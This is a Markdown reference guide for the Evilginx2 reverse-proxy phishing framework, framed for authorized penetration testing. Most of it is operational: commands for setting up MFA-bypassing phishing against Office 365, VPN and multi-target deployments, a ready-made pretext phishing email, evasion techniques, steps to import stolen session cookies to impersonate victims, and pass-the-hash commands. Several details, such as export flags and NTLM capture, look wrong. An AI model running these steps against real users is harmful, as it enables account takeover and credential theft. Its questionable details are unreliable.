---
tool_name: "evilginx2"
display_name: "Evilginx2"
mitre_tactic: "collection"
mitre_tactic_id: "TA0009"
mitre_subcategory: "man-in-the-middle_phishing"
install_command: "sudo apt install evilginx2"
version: "3.3.0"
github_repo: "https://github.com/kgretzky/evilginx2"
kali_tools_page: "https://www.kali.org/tools/evilginx2/"
difficulty_level: "intermediate-to-advanced"
requires_root: true
gui_available: false
tags: ["phishing", "mitm", "session-hijacking", "2fa-bypass", "reverse-proxy", "credential-harvesting"]
related_tools: ["mitmproxy", "setoolkit", "gophish", "ferret-sidejack"]
---

# Evilginx2 - Advanced MITM Phishing Framework

## Chapter 1: Introduction & Overview

### What is Evilginx2?

Evilginx2 is a standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows bypassing 2-factor authentication protection. Unlike traditional phishing tools that capture only credentials, Evilginx2 acts as a reverse proxy between the victim's browser and the legitimate website, transparently forwarding all traffic while capturing session tokens in real time.

### History & Background

- **Created:** 2017 by Kuba Gretzky (mrgretzky)
- **Original:** Evilginx v1 used a custom nginx HTTP server for MITM proxying
- **Current:** Evilginx2/3 rewritten in Go as a standalone application with built-in HTTP and DNS servers
- **License:** BSD-3-Clause
- **Latest Release:** v3.3.0 (April 2024)

Evilginx2 represents a paradigm shift in phishing attacks. Traditional phishing captures usernames and passwords, but modern 2FA renders those credentials useless. Evilginx2 solves this by proxying the entire session — once a victim authenticates through the reverse proxy, the attacker receives valid session cookies that bypass 2FA entirely.

### When to Use This Tool

- **Penetration testing:** Simulate advanced phishing attacks against organizations
- **Red team engagements:** Bypass multi-factor authentication protections
- **Security assessments:** Evaluate employee resilience to sophisticated phishing
- **CTF challenges:** Session hijacking and authentication bypass challenges
- **Research:** Study session cookie security and MFA bypass techniques

### When NOT to Use This Tool

- Without explicit written authorization from the target organization
- Against production systems without proper scope agreements
- For credential theft or unauthorized access
- Against individuals without consent

### Legal and Ethical Considerations

- **Written authorization is mandatory** — Evilginx2 bypasses MFA, which is a severe attack vector
- **Scope must include phishing** — many pentest agreements exclude social engineering
- **Document all captured credentials** — maintain chain of custody for findings
- **Secure captured data** — session cookies and credentials are highly sensitive
- **Report findings promptly** — organizations need to know their MFA is bypassable
- **Do not retain credentials** beyond the engagement period

### Key Concepts

| Concept | Description |
|---------|-------------|
| **Reverse Proxy** | Evilginx2 sits between victim and real site, forwarding all traffic transparently |
| **Phishlet** | YAML configuration file defining how to proxy a specific website (URL rewrites, cookie hooks) |
| **Session Cookie Theft** | Capturing authentication cookies to bypass 2FA without needing the second factor |
| **Subdomain Phishing** | Hosting phishing pages on attacker-controlled subdomains (e.g., login.target.com.attacker.com) |
| **Let's Encrypt** | Automatic TLS certificate generation for convincing phishing domains |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (Kali Linux recommended)
- **Root access:** Required for DNS server (port 53) and HTTP/HTTPS (ports 80/443)
- **Network:** Public IP or port forwarding for external phishing access
- **Domain:** Registered domain with NS records pointing to attacker's server
- **Disk Space:** ~15 MB
- **Memory:** ~50 MB RAM

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install evilginx2
```

#### Method 2: From Source

```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make
sudo ./evilginx2
```

#### Method 3: Docker

```bash
docker pull ghcr.io/kgretzky/evilginx2:latest
docker run -it --net=host ghcr.io/kgretzky/evilginx2:latest
```

### Initial Configuration

```bash
# Start evilginx2 with root privileges
sudo evilginx2

# Set the external IP (your server's public IP)
config domain attacker.com
config ip 203.0.113.10

# Set Let's Encrypt account email for automatic certs
config letsencrypt email admin@attacker.com
config letsencrypt true
```

**Explanation:** The `config` command sets global parameters. The domain is your phishing domain, the IP is your server's external address, and Let's Encrypt integration provides free TLS certificates automatically.

### DNS Setup

Point your domain's NS records to your server:

```
attacker.com.    NS    ns1.attacker.com.
ns1.attacker.com.  A    203.0.113.10
```

Verify with:

```bash
dig NS attacker.com
dig A ns1.attacker.com
```

---

## Chapter 3: Architecture & Operation

### Attack Flow

```
1. Attacker configures phishlet for target site
2. Victim receives phishing link (e.g., login.target.attacker.com)
3. Victim's browser resolves to attacker's IP
4. Evilginx2 serves cloned login page with valid TLS cert
5. Victim enters credentials on the proxy
6. Evilginx2 forwards credentials to real site, receives session cookies
7. Session cookies are captured and stored
8. Attacker uses captured cookies to access victim's account
9. 2FA is completely bypassed — session is already authenticated
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Phishing | T1566 | Delivering malicious links to victims |
| Man-in-the-Middle | T1557 | Intercepting communications via reverse proxy |
| Credential Access | T1539 | Stealing session cookies |
| Lateral Movement | T1550 | Using stolen authentication tokens |
| Collection | T1185 | Session hijacking via cookie theft |

### Phishlet Structure

```yaml
# Example phishlet structure (simplified)
name: "example"
author: "attacker"
min_version: "2.3.0"

sub_filters:
  - trigger: "target.com"
    replace: "target.attacker.com"
    sub: true

auth_tokens:
  - domain: ".target.com"
    key: "session_id"
    type: "URL"

auth_urls:
  - "target.com/auth/callback"

login:
  domain: "target.com"
  path: "/login"

```

### How Phishlets Work

1. **sub_filters:** URL rewriting rules that replace legitimate domains with attacker domains
2. **auth_tokens:** Cookie names to capture (session tokens, CSRF tokens, etc.)
3. **auth_urls:** URLs that signal successful authentication (trigger cookie capture)
4. **login:** Path where credentials are submitted
5. **auth_domains:** Additional domains to proxy (CDN, API endpoints)

---

## Chapter 4: Command Reference

### Server Management

#### Starting Evilginx2

```bash
sudo evilginx2
```

**Explanation:** Starts the interactive console. Must run as root for port 53 binding.

#### Starting with Custom Paths

```bash
sudo evilginx2 -p /opt/phishlets -c /opt/config
```

**Explanation:** Use custom phishlet directory and configuration directory.

#### Debug Mode

```bash
sudo evilginx2 -debug
```

**Explanation:** Enable verbose logging for troubleshooting proxy issues.

### Configuration Commands

#### Set Domain

```bash
config domain attacker.com
```

**Explanation:** Set the base domain used for phishing subdomains.

#### Set External IP

```bash
config ip 203.0.113.10
```

**Explanation:** Set the public IP address victims will connect to.

#### Enable Let's Encrypt

```bash
config letsencrypt true
config letsencrypt email admin@attacker.com
```

**Explanation:** Enable automatic TLS certificate generation via Let's Encrypt.

#### View Configuration

```bash
config
```

**Explanation:** Display all current configuration settings.

### Phishlet Management

#### List Available Phishlets

```bash
phishlets
```

**Explanation:** Show all loaded phishlets and their status (enabled/disabled).

#### Enable a Phishlet

```bash
phishlets hostname o365 login.attacker.com
phishlets enable o365
```

**Explanation:** Assign a hostname to the phishlet and activate it. The hostname becomes the phishing URL.

#### Disable a Phishlet

```bash
phishlets disable o365
```

**Explanation:** Deactivate the phishlet and stop serving its phishing page.

#### Create Custom Phishlet

```bash
phishlets create myphish myphish.yaml
```

**Explanation:** Create a new phishlet from a YAML template.

### Lure Management

#### Create a Lure

```bash
lures create o365
```

**Explanation:** Create a phishing URL lure for the specified phishlet. Returns a lure ID.

#### List Lures

```bash
lures
```

**Explanation:** Show all active lures with their URLs and capture statistics.

#### Set Lure Redirect

```bash
lures set 0 redirect "https://real-login-page.com"
```

**Explanation:** Set a redirect URL after successful credential capture.

#### Delete a Lure

```bash
lures delete 0
```

**Explanation:** Remove a lure by its ID.

### Session Management

#### List Captured Sessions

```bash
sessions
```

**Explanation:** Show all captured sessions with usernames, tokens, and timestamps.

#### Export Session Cookies

```bash
sessions export 0
```

**Explanation:** Export session cookies in a format usable by browser extensions or curl.

#### Delete a Session

```bash
sessions delete 0
```

**Explanation:** Remove a captured session by its ID.

### LetsEncrypt Management

#### List Certificates

```bash
letsencrypt
```

**Explanation:** Show all issued Let's Encrypt certificates.

#### Request Certificate

```bash
letsencrypt sign login.attacker.com
```

**Explanation:** Manually request a TLS certificate for a specific hostname.

#### Revoke Certificate

```bash
letsencrypt revoke login.attacker.com
```

**Explanation:** Revoke an issued certificate.

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Office 365 Phishing with MFA Bypass

**Setup:**

```bash
# Configure evilginx2
config domain o365-evil.com
config ip 203.0.113.10
config letsencrypt true
config letsencrypt email admin@o365-evil.com

# Enable Office 365 phishlet
phishlets hostname o365 login.o365-evil.com
phishlets enable o365

# Create lure
lures create o365
lures set 0 redirect "https://www.office.com"
```

**Attack Flow:**
1. Send phishing link: `https://login.o365-evil.com/[lure-id]`
2. Victim sees legitimate-looking Office 365 login page
3. Victim enters credentials + completes MFA
4. Evilginx2 captures session tokens
5. Attacker uses cookies to access victim's mailbox

**Key Insight:** MFA is completely bypassed because the attacker captures the session cookie after authentication, not the credentials before it.

### Scenario 2: Corporate VPN Phishing

```bash
# Enable phishlet for corporate VPN
phishlets hostname vpn corporate-vpn.attacker.com
phishlets enable vpn

# Create targeted lure
lures create vpn
lures set 0 redirect "https://vpn.corporate.com"
```

**Phishing Email:**

```
Subject: VPN Certificate Expiration Warning
From: IT-Security@corporate.com

Your VPN certificate will expire in 48 hours. Please re-authenticate
at https://vpn.corporate-vpn.attacker.com to renew your access.

- IT Security Team
```

### Scenario 3: Multi-Target Engagement

```bash
# Configure for multiple target domains
phishlets hostname o365 login.client1-evil.com
phishlets hostname google login.client2-evil.com
phishlets hostname github login.client3-evil.com

phishlets enable o365
phishlets enable google
phishlets enable github

# Create lures for each
lures create o365
lures create google
lures create github
```

**Explanation:** Evilginx2 can run multiple phishlets simultaneously, each on its own subdomain, enabling engagement against multiple targets from a single server.

---

## Chapter 6: Detection & Evasion

### Detection Signatures

**Network-Level Detection:**
- DNS queries to unfamiliar subdomains of known brands
- TLS certificates from Let's Encrypt for brand-name subdomains
- HTTP traffic to IP addresses not belonging to the legitimate brand

**Endpoint Detection:**
- Browser extensions that verify domain ownership
- Certificate transparency log monitoring
- DNS-over-HTTPS (DoH) preventing DNS manipulation

**SIEM Rules:**

```
# Splunk detection for suspicious subdomains
index=network dns_query NOT LIKE "%.legitimate-domain.com"
| stats count by dns_query, src_ip
| where count > 5
```

### Evasion Techniques

1. **Subdomain Obfuscation:** Use confusing subdomains (e.g., `secure-login.legitimate.com.attacker.com`)
2. **Timing:** Launch phishing during business hours when email volume is high
3. **Redirect Chaining:** Use multiple redirects before reaching the phishlet
4. **Custom Phishlets:** Modify default phishlets to avoid signature detection
5. **IP Rotation:** Use multiple IPs for the phishing server
6. **URL Shorteners:** Mask phishing URLs with legitimate-looking shorteners

### Blue Team Countermeasures

- **DMARC/DKIM/SPF:** Prevent email spoofing from your domain
- **Certificate Transparency Monitoring:** Alert on certificates issued for your brand
- **DNS Monitoring:** Detect queries to suspicious subdomains
- **Browser Isolation:** Isolate untrusted web content
- **FIDO2/WebAuthn:** Hardware security keys are immune to phishing

---

## Chapter 7: Integration with Other Tools

### Gophish Integration

Evilginx2 v3.3+ integrates directly with Gophish for phishing campaign management:

```bash
# Use the Gophish fork with Evilginx2 support
git clone https://github.com/kgretzky/gophish.git
cd gophish
go build
```

**Configuration:**
1. Set Gophish sending profile to your SMTP server
2. Create email templates with Evilginx2 lure URLs
3. Import target lists
4. Launch campaign — Gophish handles email delivery, Evilginx2 handles credential capture

### Browser Cookie Import

```bash
# Export cookies for Firefox
sessions export 0 --format=firefox

# Export cookies for Chrome
sessions export 0 --format=chrome

# Export cookies for curl
sessions export 0 --format=curl
```

**Using captured cookies in browser:**
1. Install a cookie editor extension (e.g., "EditThisCookie" or "Cookie-Editor")
2. Navigate to the target domain
3. Import the exported cookies
4. Refresh the page — you're authenticated as the victim

### Cobalt Strike Integration

Evilginx2 can feed captured credentials into Cobalt Strike for lateral movement:

```bash
# Capture credentials, then use Cobalt Strike to:
# 1. Generate Beacon DLLs
# 2. Use captured session for initial access
# 3. Pivot within the network using captured tokens
```

### Impacket Integration

Use captured NTLM hashes with Impacket tools:

```bash
# After capturing NTLMv2 hash
impacket-psexec domain/user:hash@target.local
impacket-wmiexec domain/user:hash@target.local
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: Cannot bind to port 53**

```bash
# Check what's using port 53
sudo ss -lntp | grep :53

# Kill existing DNS service
sudo systemctl stop systemd-resolved
sudo systemctl disable systemd-resolved

# Or use a different DNS port (requires external DNS redirect)
evilginx2 -developer
```

**Issue: TLS certificate not issued**

```bash
# Verify DNS is pointing to your server
dig A login.attacker.com

# Check Let's Encrypt status
letsencrypt

# Manually request certificate
letsencrypt sign login.attacker.com

# Check firewall allows port 80 and 443
sudo iptables -L -n | grep -E "80|443"
```

**Issue: Phishlet not loading**

```bash
# Check phishlet syntax
phishlets edit myphish

# Verify phishlet directory
phishlets

# Check debug logs
# Start evilginx2 with -debug flag
sudo evilginx2 -debug
```

**Issue: Cookies not being captured**

```bash
# Verify auth_tokens in phishlet are correct
phishlets edit myphish

# Check session logs
sessions

# Enable debug mode to see all traffic
# Look for Set-Cookie headers in the debug output
```

**Issue: Victim sees certificate warning**

```bash
# Ensure Let's Encrypt is working
config letsencrypt true
letsencrypt

# Verify the hostname matches the certificate
dig A login.attacker.com
openssl s_client -connect login.attacker.com:443 -servername login.attacker.com
```

### Debug Mode

```bash
# Start with full debug output
sudo evilginx2 -debug 2>&1 | tee evilginx_debug.log

# Filter for specific phishlet
grep -i "phishlet_name" evilginx_debug.log
```

### Log Files

```bash
# Evilginx2 logs
ls ~/.evilginx2/

# Session data
cat ~/.evilginx2/sessions.db

# Configuration
cat ~/.evilginx2/config.yaml
```

---

## Resources

- **GitHub:** https://github.com/kgretzky/evilginx2
- **Documentation:** https://help.evilginx.com
- **Evilginx Mastery Course:** https://academy.breakdev.org/evilginx-mastery
- **Gophish Integration:** https://github.com/kgretzky/gophish
- **Blog Posts by Kuba Gretzky:** https://breakdev.org/tag/evilginx/
- **Kali Documentation:** https://www.kali.org/tools/evilginx2/
- **Pro Version:** https://evilginx.com
- **Related Tool - mitmproxy:** https://mitmproxy.org
- **Related Tool - SET:** https://github.com/trustedsec/social-engineer-toolkit
